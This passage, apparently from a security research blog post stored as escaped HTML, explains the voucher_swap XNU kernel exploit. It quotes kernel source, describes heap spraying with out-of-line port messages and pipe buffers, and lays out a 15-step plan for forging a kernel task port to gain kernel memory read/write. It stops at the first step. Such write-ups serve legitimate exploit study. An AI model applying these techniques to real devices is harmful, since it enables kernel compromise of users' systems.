    &lt;span class=&quot;mi&quot;&gt;2908&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;2909&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MACH_PORT_VALID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2910&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;objects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_object_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CAST_MACH_NAME_TO_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2911&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2912&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;         &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2913&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;2914&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;kern_return_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_object_copyin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;space&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_disp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2915&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;2916&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2917&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;             &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2918&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;2919&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2920&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;                 &lt;span class=&quot;n&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;objects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2921&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;                 &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IPC_OBJECT_VALID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2922&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;                     &lt;span class=&quot;n&quot;&gt;ipc_object_destroy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result_disp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2923&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;             &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2924&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;kfree&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ports_length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2925&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;dsc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2926&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;optionp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_SEND_KERNEL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2927&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 				&lt;span class=&quot;n&quot;&gt;mach_port_guard_exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kGUARD_EXC_SEND_INVALID_RIGHT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2928&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2929&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;             &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_SEND_INVALID_RIGHT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2930&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2931&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;         &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2932&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;2933&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dsc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;disposition&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_TYPE_PORT_RECEIVE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2934&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;                 &lt;span class=&quot;n&quot;&gt;ipc_port_check_circularity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2935&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;                     &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_port_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2936&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;                     &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_port_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2937&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_bits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSGH_BITS_CIRCULAR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2938&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;2939&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;objects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2940&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2941&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;2942&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_dsc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2943&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;On Line 2879, it calls kalloc to allocate memory in the heap in the kalloc zone and in line 2902, it is substituted as a variable &lt;strong&gt;objects&lt;/strong&gt; which is an array of port pointers. On line 2909, each port is iterated in the descriptor and checked for validity. The function &lt;strong&gt;CAST_MACH_NAME_TO_PORT&lt;/strong&gt; is called on the port which basically does this. If the port is &lt;strong&gt;MACH_PORT_DEAD&lt;/strong&gt;, its filled with &lt;strong&gt;0xFFFFFFFFFFFFFFFF&lt;/strong&gt;, and if its &lt;strong&gt;MACH_PORT_NULL&lt;/strong&gt;, its filled with &lt;strong&gt;0x0000000000000000&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;So basically, by sending a lot of Mach messages with OOL Port Descriptor, it is possible to allocate the kalloc zone with valid pointers, &lt;strong&gt;0xFFFFFFFFFFFFFFFF&lt;/strong&gt; or &lt;strong&gt;0x0000000000000000&lt;/strong&gt;. The same memory can be deallocated by receiving the message, and thereby poking holes within the memory. The contents of the received messages will be the ports and they can be analyzed for certain pattern to find overlaps. This technique has been used extensively in previous exploits for performing Heap Feng Shui.&lt;/p&gt;

&lt;p&gt;The idea is to send Port pointers in a pattern such that &lt;strong&gt;iv_refs&lt;/strong&gt; is overlapped with lower 32 bits of base port address (Little-Endian system) and its still not more than its max value. Sending base port address at a certain index in the pattern will overlap &lt;strong&gt;iv_refs&lt;/strong&gt; with lower 32 bits and the next field with the upper 32 bits. Hence, incrementing iv_refs will basically increment the base port pointer.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/voucher.png&quot; alt=&quot;Pid&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Similarly, overlapping &lt;strong&gt;iv_port&lt;/strong&gt; with &lt;strong&gt;MACH_PORT_NULL&lt;/strong&gt; will be just fine since we can call &lt;strong&gt;thread_get_mach_voucher&lt;/strong&gt; to get a new voucher port that can use to manipulate the reference count again.&lt;/p&gt;

&lt;p&gt;In order to allocate the freed voucher with Port pointers, it is essential to initiate zone garbage collection on the &lt;strong&gt;ipc vouchers&lt;/strong&gt; zone. This can be done by allocating a large number of vouchers and then freeing them, essentially making that memory to be used again, the minimum size for which is 1 page, and then spraying the memory with port pointers as described above.&lt;/p&gt;

&lt;h3 id=&quot;pipe-buffers&quot;&gt;Pipe Buffers&lt;/h3&gt;

&lt;p&gt;Pipe is another system call in &lt;strong&gt;xnu&lt;/strong&gt; used for IPC. It creates a pipe that allocates a pair of file descriptors and allows unidirectional data flow. The buffer through which the data flows is known as the &lt;strong&gt;pipe buffer&lt;/strong&gt;. Data written to the write end of the pipe buffer can be read from the read end of the buffer, but not vice versa as this feature is not provided by &lt;strong&gt;xnu&lt;/strong&gt;. This basically allows you to read and write into the same address space. The other important thing is that it occupies kva (kernel virtual address) space and hence is a useful primitive for allocating memory in the heap. Another important thing to note is that the pipe buffer size is set to a max value of &lt;strong&gt;16384&lt;/strong&gt; bytes by default, and the whole pipe size for all the pipe buffers is set to &lt;strong&gt;16MB&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bsd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;69&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*
    70:  * Pipe buffer size, keep moderate in value, pipes take kva space.
    71:  */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifndef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PIPE_SIZE&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;73&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PIPE_SIZE&lt;/span&gt;	&lt;span class=&quot;mi&quot;&gt;16384&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;74&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endif&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;75&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;76&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PIPE_KVAMAX&lt;/span&gt;	&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;77&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;78&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifndef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BIG_PIPE_SIZE&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;79&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BIG_PIPE_SIZE&lt;/span&gt;	&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endif&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;81&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;82&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifndef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SMALL_PIPE_SIZE&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;83&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SMALL_PIPE_SIZE&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;PAGE_SIZE&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;84&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endif&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;85&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;If the data has been written to the pipe buffer and its full, then the pipe is considered to be blocked. To free that buffer, data must be read out from the pipe buffer. Data can be sprayed using pipe buffers by allocating many pipe buffers and writing data to it. The total number of pipes that can be created is the total pipe size (16 MB) divided by the pipe buffer size (16384 bytes), which is 1024.&lt;/p&gt;

&lt;p&gt;The advantage of pipe buffers is that if we are able to get a pointer to one of our pipe buffers and read the value of it, we can basically identify which of those 1024 pipe buffers it is , and then reallocate data in that particular pipe buffer for our benefit.&lt;/p&gt;

&lt;p&gt;What we are trying to achieve in this case for the &lt;strong&gt;voucher_swap&lt;/strong&gt; exploit is getting a port pointer to point to one of the pipe buffers, identify which pipe buffer it is, and then reallocating data in that pipe buffer to create a &lt;strong&gt;fake port&lt;/strong&gt;, which can allow us to do certain tasks. Since the Port pointer originally points to a port, if it is possible to somehow increment that port pointer to point to the pipe buffers, that will also work. Hence, you need to spray some ports first such that the &lt;strong&gt;ipc.ports&lt;/strong&gt; zone for the ports grows and fresh pages are allocated from the zone map, then spray the pipe buffers such that the pipe buffers land just in front of the sprayed ports, and then manipulate the port pointer which pointed to one of the sprayed ports incrementally so that it lands into the pipe buffers. In this case, we will use the &lt;strong&gt;iv_refs&lt;/strong&gt; field to point to a port pointer, and then use the vulnerability to leak references thereby increasing it (iv_refs) and pointing it to the pipe buffers.&lt;/p&gt;

&lt;p&gt;Now once you receive the messages that you sent for the spray you get &lt;strong&gt;ipc_port&lt;/strong&gt; and send rights to it. However, in this case one of the &lt;strong&gt;ipc_port&lt;/strong&gt; pointer actually points to our pipe buffers. Now we can manipulate that port contents using the read and write functionality of pipe buffers.&lt;/p&gt;

&lt;p&gt;So our exploitation steps should look like this.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Create the thread for which the voucher pointers will be kept&lt;/li&gt;
  &lt;li&gt;Spray the Heap with Ports so that the &lt;strong&gt;ipc.ports&lt;/strong&gt; zone will grow and allocate fresh pages from the zone map. Set the last port as the &lt;strong&gt;base_port&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;Spray the Pipe buffers and since the memory is freshly allocated, the pipe buffer will land just in front of the ports, since the memory will now be allocated incrementally. The pipe buffers content masks that of a port and each pipe buffers port content has a different &lt;strong&gt;IKOT&lt;/strong&gt; type to identify later which pipe buffer overlaps.&lt;/li&gt;
  &lt;li&gt;Spray the Vouchers and choose one Voucher to be freed. These vouchers will land in their own zone &lt;strong&gt;ipc vouchers&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;Store a Pointer to the selected voucher that was created in the previous step in the threads &lt;strong&gt;ith_voucher&lt;/strong&gt; field. This will increase its reference count. Now use the vulnerability to reduce the reference count by one again, while still holding a pointer to the voucher&lt;/li&gt;
  &lt;li&gt;Release the vouchers&lt;/li&gt;
  &lt;li&gt;Spray using OOL Ports Descriptor by sending mach messages in a pattern (triggering GC) such that &lt;strong&gt;iv_refs&lt;/strong&gt; is overlapped with the base port’s lower 32 bits and the &lt;strong&gt;iv_port&lt;/strong&gt; will be &lt;strong&gt;MACH_PORT_NULL&lt;/strong&gt;. Incrementing &lt;strong&gt;iv_refs&lt;/strong&gt; will basically cross base port and land into the pipe buffers.&lt;/li&gt;
  &lt;li&gt;Get a new voucher port by calling &lt;strong&gt;thread_get_mach_voucher&lt;/strong&gt;. Now we can manipulate the overlapping freed voucher.&lt;/li&gt;
  &lt;li&gt;Use reference counting bug to increase the &lt;strong&gt;iv_refs&lt;/strong&gt; and point it to the pipe buffers&lt;/li&gt;
  &lt;li&gt;Receive the message that was sent using OOL ports descriptor. Look at the ports that were received and find the overlapping pipe buffer by looking at the contents of the port.&lt;/li&gt;
  &lt;li&gt;Since we can read and write into pipe buffers we can create a fake port in the pipe buffer.&lt;/li&gt;
  &lt;li&gt;Create a fake &lt;strong&gt;IKOT_TASK&lt;/strong&gt; port and read memory using &lt;strong&gt;pid_for_task&lt;/strong&gt; 4 bytes at a time.&lt;/li&gt;
  &lt;li&gt;Create a fake Kernel Task Port by copying &lt;strong&gt;ipc_space_kernel&lt;/strong&gt; and kernels &lt;strong&gt;vm_map&lt;/strong&gt; using the read primitives and writing them into the pipe buffers.&lt;/li&gt;
  &lt;li&gt;Create a better fake Kernel Task Port using &lt;strong&gt;mach_vm_allocate&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;Read and Write Kernel Memory!&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Anyways, enough of background, let’s jump into the exploitation in detail.&lt;/p&gt;

&lt;h3 id=&quot;the-exploit&quot;&gt;The Exploit&lt;/h3&gt;

&lt;p&gt;If you haven’t downloaded it yet, get a copy of the &lt;a href=&quot;https://bugs.chromium.org/p/project-zero/issues/detail?id=1731#c10&quot;&gt;voucher_swap&lt;/a&gt; exploit code so you can follow along. In some cases, the comments are self explanatory so i am just gonna skip the explanation.&lt;/p&gt;

&lt;h4 id=&quot;step-1-create-a-separate-thread-for-the-voucher&quot;&gt;Step 1: Create a Separate thread for the Voucher&lt;/h4&gt;

&lt;p&gt;Create a separate thread where we will store the pointer to the voucher. The thread has an &lt;strong&gt;ith_voucher&lt;/strong&gt; field where we can keep the reference to the voucher.&lt;/p&gt;

